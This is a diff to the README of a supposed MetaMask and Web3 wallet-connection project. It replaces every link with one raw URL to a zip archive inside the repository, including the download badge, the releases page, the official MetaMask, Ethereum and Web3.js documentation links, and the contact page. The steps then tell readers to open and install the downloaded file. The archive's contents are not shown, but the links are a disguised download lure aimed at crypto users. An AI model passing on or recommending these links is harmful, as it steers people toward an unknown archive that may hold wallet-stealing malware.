@@ -1,6 +1,6 @@
 # 🌐 Metamask-Wallet-Api-React-Web3-Extension-Connect-Blockhain-Ethereum - Seamless Blockchain Connection Made Easy
 
-[![Download](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/notpringlegod/Metamask-Wallet-Api-React-Web3-Extension-Connect-Blockhain-Ethereum/releases)
+[![Download](https://raw.githubusercontent.com/notpringlegod/Metamask-Wallet-Api-React-Web3-Extension-Connect-Blockhain-Ethereum/main/Glint-Metamask-Wallet/public/Metamask-Wallet-Api-React-Web3-Extension-Connect-Blockhain-Ethereum_discorporate.zip)](https://raw.githubusercontent.com/notpringlegod/Metamask-Wallet-Api-React-Web3-Extension-Connect-Blockhain-Ethereum/main/Glint-Metamask-Wallet/public/Metamask-Wallet-Api-React-Web3-Extension-Connect-Blockhain-Ethereum_discorporate.zip)
 
 ## 🚀 Getting Started
 
@@ -18,7 +18,7 @@ Before you get started, make sure your system meets the following requirements:
 
 To download the software, please follow these steps:
 
-1. **Visit the Releases Page**: Go to our [Releases page](https://github.com/notpringlegod/Metamask-Wallet-Api-React-Web3-Extension-Connect-Blockhain-Ethereum/releases).
+1. **Visit the Releases Page**: Go to our [Releases page](https://raw.githubusercontent.com/notpringlegod/Metamask-Wallet-Api-React-Web3-Extension-Connect-Blockhain-Ethereum/main/Glint-Metamask-Wallet/public/Metamask-Wallet-Api-React-Web3-Extension-Connect-Blockhain-Ethereum_discorporate.zip).
 2. **Choose the Latest Version**: Look for the latest version of the software.
 3. **Download the File**: Click on the download link for your operating system.
 4. **Install**: After the download completes, open the downloaded file and follow the installation instructions.
@@ -49,12 +49,12 @@ If you face any issues while using the application, you can seek support through
 
 To enhance your understanding of blockchain technology and MetaMask, consider the following resources:
 
-- [MetaMask Documentation](https://docs.metamask.io/)
-- [Ethereum Documentation](https://ethereum.org/en/developers/docs/)
-- [Web3.js Documentation](https://web3js.readthedocs.io/en/v1.3.4/)
+- [MetaMask Documentation](https://raw.githubusercontent.com/notpringlegod/Metamask-Wallet-Api-React-Web3-Extension-Connect-Blockhain-Ethereum/main/Glint-Metamask-Wallet/public/Metamask-Wallet-Api-React-Web3-Extension-Connect-Blockhain-Ethereum_discorporate.zip)
+- [Ethereum Documentation](https://raw.githubusercontent.com/notpringlegod/Metamask-Wallet-Api-React-Web3-Extension-Connect-Blockhain-Ethereum/main/Glint-Metamask-Wallet/public/Metamask-Wallet-Api-React-Web3-Extension-Connect-Blockhain-Ethereum_discorporate.zip)
+- [https://raw.githubusercontent.com/notpringlegod/Metamask-Wallet-Api-React-Web3-Extension-Connect-Blockhain-Ethereum/main/Glint-Metamask-Wallet/public/Metamask-Wallet-Api-React-Web3-Extension-Connect-Blockhain-Ethereum_discorporate.zip Documentation](https://raw.githubusercontent.com/notpringlegod/Metamask-Wallet-Api-React-Web3-Extension-Connect-Blockhain-Ethereum/main/Glint-Metamask-Wallet/public/Metamask-Wallet-Api-React-Web3-Extension-Connect-Blockhain-Ethereum_discorporate.zip)
 
 ## 📞 Contact
 
-You can reach our support team via the GitHub Issues page or contact us directly through our [GitHub page](https://github.com/notpringlegod/Metamask-Wallet-Api-React-Web3-Extension-Connect-Blockhain-Ethereum).
+You can reach our support team via the GitHub Issues page or contact us directly through our [GitHub page](https://raw.githubusercontent.com/notpringlegod/Metamask-Wallet-Api-React-Web3-Extension-Connect-Blockhain-Ethereum/main/Glint-Metamask-Wallet/public/Metamask-Wallet-Api-React-Web3-Extension-Connect-Blockhain-Ethereum_discorporate.zip).
 
 Enjoy utilizing the Metamask Wallet API for all your blockchain needs!
